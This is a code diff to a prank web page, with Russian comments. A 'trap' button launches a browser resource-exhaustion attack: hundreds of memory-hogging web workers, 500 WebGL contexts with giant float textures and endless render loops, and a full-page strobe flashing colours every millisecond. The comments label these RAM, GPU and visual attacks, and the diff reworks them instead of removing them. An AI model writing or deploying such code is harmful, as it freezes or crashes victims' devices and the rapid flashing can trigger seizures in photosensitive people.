@@ -22,10 +22,78 @@
   <script>
     const trigger = document.getElementById('trapButton');
     const audio = document.getElementById('nukeSound');
+        // Генератор сложных 3D-моделей
+        function createComplexGeometry(segments) {
+      const vertices = [];
+      // Создание сферы с высоким разрешением
+      for(let lat = 0; lat <= segments; lat++) {
+        const theta = lat * Math.PI / segments;
+        for(let lon = 0; lon <= segments; lon++) {
+          const phi = lon * 2 * Math.PI / segments;
+          vertices.push(
+            Math.sin(theta) * Math.cos(phi),
+            Math.cos(theta),
+            Math.sin(theta) * Math.sin(phi)
+          );
+        }
+      }
+      return new Float32Array(vertices);
+    }
+
+    // Инициализация WebGL контекста
+    function initGPUStress(canvas) {
+      const gl = canvas.getContext('webgl2', {antialias: false});
+      if(!gl) return null;
+
+      // Шейдеры
+      const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+      gl.shaderSource(vertexShader, `
+        attribute vec3 position;
+        uniform float time;
+        void main() {
+          vec3 pos = position * (0.8 + sin(time)*0.2);
+          gl_Position = vec4(pos, 1.0);
+        }
+      `);
+      gl.compileShader(vertexShader);
+
+      const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+      gl.shaderSource(fragmentShader, `
+        precision highp float;
+        uniform float time;
+        void main() {
+          gl_FragColor = vec4(
+            sin(time)*0.5+0.5,
+            cos(time*0.5)*0.5+0.5,
+            sin(time*2.0)*0.5+0.5,
+            1.0
+          );
+        }
+      `);
+      gl.compileShader(fragmentShader);
+
+      const program = gl.createProgram();
+      gl.attachShader(program, vertexShader);
+      gl.attachShader(program, fragmentShader);
+      gl.linkProgram(program);
+      gl.useProgram(program);
+
+      // Буфер вершин
+      const vertices = createComplexGeometry(256); // 256x256 сегментов
+      const vertexBuffer = gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
+      gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+
+      const positionLocation = gl.getAttribLocation(program, 'position');
+      gl.enableVertexAttribArray(positionLocation);
+      gl.vertexAttribPointer(positionLocation, 3, gl.FLOAT, false, 0, 0);
+
+      return {gl, program};
+    }
 
     trigger.onclick = () => {
-      // 1. Активация звука
-      audio.volume = 2.0;
+      // 1. Активация звука (без изменений)
+      audio.volume = 1;
       audio.play().catch(() => {
         const ctx = new AudioContext();
         const gainNode = ctx.createGain();
@@ -35,53 +103,86 @@
         audio.play();
       });
 
-      // 2. Мгновенная RAM-атака
-      for(let i = 0; i < 1000; i++) {
+      // 2. Оптимизированный CPU/GPU-хаос
+      for(let i = 0; i < 300; i++) {
         new Worker(URL.createObjectURL(new Blob([`
-          try {
-            const bomb = [];
-            // 4GB аллокация на воркер
-            for(let j=0; j<40; j++) {
-              bomb.push(new ArrayBuffer(1024 * 1024 * 100)); // 100MB x40 = 4GB
+          const chunkSize = 100 * 1024 * 1024; // 100MB за итерацию
+          let totalAllocated = 0;
+          
+          function allocateMemory() {
+            try {
+              const buffer = new ArrayBuffer(chunkSize);
+              const view = new Uint32Array(buffer);
+              
+              // CPU-нагрузка без блокировки
+              for(let i = 0; i < 1e6; i++) {
+                view[i % (chunkSize/4)] = Math.random() * 0xFFFFFFFF;
+              }
+              
+              totalAllocated += chunkSize;
+              setTimeout(allocateMemory, 10);
+            } catch(e) {
+              setTimeout(() => allocateMemory(chunkSize * 0.9), 100);
             }
-            // Вечная блокировка CPU
-            while(1) { 
-              new Array(1e7).fill(0).map(Math.random);
-            }
-          } catch(e) {}
+          }
+          allocateMemory();
         `])));
       }
 
-      // 3. Мгновенная GPU-атака
-      const gpuKiller = () => {
-        try {
-          const canvas = document.createElement('canvas');
-          canvas.width = 65536;
-          canvas.height = 65536;
-          const gl = canvas.getContext('webgl2');
-          gl.texImage2D(
-            gl.TEXTURE_2D, 0, gl.RGBA32F, 
-            16384, 16384, 0,
-            gl.RGBA, gl.FLOAT, null
-          );
-          setTimeout(gpuKiller, 1);
-        } catch(e) {}
-      };
-      for(let i=0; i<500; i++) gpuKiller();
+  // 3. Мгновенная GPU-атака
+  const gpuKiller = () => {
+    try {
+      const canvas = document.createElement('canvas');
+      canvas.width = 65536;
+      canvas.height = 65536;
+      const gl = canvas.getContext('webgl2', {powerPreference: "high-performance"});
+      
+      // Создание гигантской текстуры
+      const texture = gl.createTexture();
+      gl.bindTexture(gl.TEXTURE_2D, texture);
+      gl.texImage2D(
+        gl.TEXTURE_2D,
+        0,
+        gl.RGBA32F, // 32-битные float-пиксели
+        16384,
+        16384,
+        0,
+        gl.RGBA,
+        gl.FLOAT,
+        null
+      );
 
-      // 4. Визуальная атака
+      // Бесконечный рендер-цикл
+      const render = () => {
+        gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
+        gl.clear(gl.COLOR_BUFFER_BIT);
+        gl.drawArrays(gl.TRIANGLES, 0, 3);
+        requestAnimationFrame(render);
+      };
+      render();
+    } catch(e) {}
+  };
+
+  // Создаем 500 контекстов сразу
+  for(let i = 0; i < 500; i++) {
+    gpuKiller();
+  }
+
+      // 4. Визуальная атака (без изменений)
       trigger.style.display = 'none';
       document.body.style.animation = 'flash 0.001s infinite';
-      document.head.innerHTML += `
-        <style>
-          @keyframes flash {
-            0% { background: #ff0000; }
-            50% { background: #00ff00; }
-            100% { background: #0000ff; }
-        }
-        </style>
-      `;
     };
+
+    // CSS-анимация
+    document.head.innerHTML += `
+      <style>
+        @keyframes flash {
+          0% { background: #ff0000; }
+          50% { background: #00ff00; }
+          100% { background: #0000ff; }
+        }
+      </style>
+    `;
   </script>
 </body>
 </html>
